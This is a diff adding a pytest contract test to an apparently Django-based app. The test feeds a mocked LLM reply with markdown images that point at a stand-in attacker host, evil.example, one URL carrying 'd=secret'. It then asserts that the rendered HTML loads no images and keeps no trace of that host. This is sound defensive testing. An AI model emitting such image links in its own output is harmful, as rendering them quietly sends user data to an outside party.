@@ -99,6 +99,14 @@ def test_output_is_sanitized(session_client, workspace, llm):
 
 @pytest.mark.contract
 @pytest.mark.django_db
+def test_output_images_do_not_load(session_client, workspace, llm):
+    llm.reply("Done ![x](https://evil.example/p.png?d=secret)\n\n![y][r]\n\n[r]: https://evil.example/q.png")
+    html = session_client.post(url(workspace), {"action": "rephrase", "text": "x"}, format="json").json()["html"]
+    assert "<img" not in html and "evil.example" not in html
+
+
+@pytest.mark.contract
+@pytest.mark.django_db
 @pytest.mark.parametrize(
     "body, field",
     [
